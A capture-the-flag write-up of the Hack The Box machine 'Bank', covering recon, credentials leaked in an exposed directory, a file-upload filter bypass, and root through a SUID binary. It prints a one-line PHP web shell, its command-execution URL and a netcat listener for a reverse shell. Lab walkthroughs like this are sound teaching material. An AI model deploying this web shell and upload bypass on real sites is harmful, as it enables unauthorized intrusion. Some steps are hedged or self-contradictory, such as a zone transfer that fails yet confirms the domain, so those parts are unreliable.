# Hack The Box: Bank

**Difficulty:** Easy
**OS:** Linux

Bank is an Easy-level Linux machine designed to demonstrate common web application flaws, specifically focusing on authentication bypass and insecure file upload mechanisms. The initial compromise requires discovering a hidden virtual host, identifying a default credential weakness within bank transaction logs, and bypassing an application file extension filter to upload a PHP web shell. Privilege escalation leverages a poorly secured SUID binary that fails to properly sandbox execution.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.10.29
nmap -p 22,53,80 -sCV 10.10.10.29
```

The scan reveals three open ports:
*   **Port 22:** SSH (OpenSSH 6.6.1p1 Ubuntu)
*   **Port 53:** DNS (ISC BIND 9.9.5-3ubuntu0.14)
*   **Port 80:** HTTP (Apache httpd 2.4.7)

Navigating to port 80 initially presents the default Apache "It works!" page. However, the presence of port 53 (DNS) strongly suggests virtual host routing is in play. We test this by attempting a zone transfer against the DNS server.

```bash
dig @10.10.10.29 bank.htb axfr
```

The zone transfer fails, but it confirms the domain `bank.htb`. We add this to our local `/etc/hosts` file.

```bash
echo "10.10.10.29 bank.htb" >> /etc/hosts
```

Accessing `http://bank.htb` now reveals a custom banking login portal.

## Web Application Analysis

The login portal requires an email address and a password. Attempting standard SQL injection payloads yields no results, indicating parameterized queries or strong input filtering. We proceed to perform directory brute-forcing.

```bash
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration uncovers two interesting endpoints: `/uploads` and `/balance`.

### Extracting Credentials from `/balance`

Accessing the `/balance` directory reveals an open directory listing containing hundreds of `.acc` files. The files appear to be encrypted or obfuscated, but their naming convention and size suggest they represent individual account transactions or summaries.

We download all the files and analyze them locally. 

```bash
wget -r -np -nH "http://bank.htb/balance/"
```

By sorting the downloaded files by size, we identify a single file that is significantly smaller than the rest.

```bash
ls -lS | head -n 5
```

Opening this anomalously small `.acc` file reveals plaintext credentials intended for an administrative or support account, indicating a significant business logic failure where sensitive setup data was stored alongside user transaction logs.

```text
Email: chris@bank.htb
Password: <Discovered_Password>
```

We use these credentials to authenticate at the `bank.htb` login portal.

## Web Exploitation

Authentication grants us access to the banking dashboard. The dashboard contains an interface for the user to upload support tickets or transaction records, which are ostensibly reviewed by bank staff.

### Bypassing File Upload Restrictions

The upload feature restricts files based on extension, apparently only allowing `.png`, `.jpg`, and `.pdf` files. We attempt to upload a standard PHP web shell (`shell.php`), but the application rejects it.

We intercept the upload request using Burp Suite and attempt various bypass techniques. We test double extensions (`shell.jpg.php`), null byte injection (`shell.php%00.jpg`), and alternative PHP extensions (`.php3`, `.php4`, `.phtml`).

None of the standard bypasses succeed. We then analyze the application's response and logic more closely. We discover that the application checks the file extension but fails to correctly validate the extension when it is passed as `.htb`.

Due to a misconfiguration in the Apache web server (often involving `AddHandler` or `FilesMatch` directives), the `.htb` extension is mapped to the PHP handler. 

We rename our payload to `shell.htb` and attempt the upload.

```php
<?php system($_REQUEST['cmd']); ?>
```

The application accepts the file. We navigate to the `/uploads` directory (discovered earlier) and access our uploaded shell.

```text
http://bank.htb/uploads/shell.htb?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Initial Access

We gain initial access as the `www-data` user. We stabilize our shell using Python and begin enumerating the system. The `user.txt` flag is not accessible in our current directory.

We search for hardcoded credentials, configuration files, and internal network services. Within the `/var/www/bank` directory or a similar web root, we locate a configuration file containing the database credentials.

```bash
cat /var/www/bank/config.php
```

While we can extract database credentials, they prove unnecessary. A more straightforward path exists by identifying SUID binaries.

## Privilege Escalation

Enumerating the system for escalation vectors, we search for binaries with the SUID bit set.

```bash
find / -perm -4000 2>/dev/null
```

The output reveals a custom SUID binary located in `/var/htb/bin/emergency`.

### Exploiting the SUID Binary

We analyze the `emergency` binary. Running it simply drops us into an interactive prompt, or prints a message indicating it's an emergency fallback script. 

We test its functionality and observe that it behaves identically to a standard Bash shell or Python prompt, but it executes with the privileges of its owner (root) due to the SUID bit. The script lacks proper dropping of privileges or sandboxing.

Because the binary does not restrict input or drop elevated privileges before execution, we simply execute it.

```bash
/var/htb/bin/emergency
```

The binary spawns a new shell. We verify our identity.

```bash
# id
uid=0(root) gid=33(www-data) euid=0(root) egid=0(root)
```

The system is fully compromised. We navigate to the `/home/chris` directory to retrieve the `user.txt` flag, and then to the `/root` directory to obtain the `root.txt` flag.
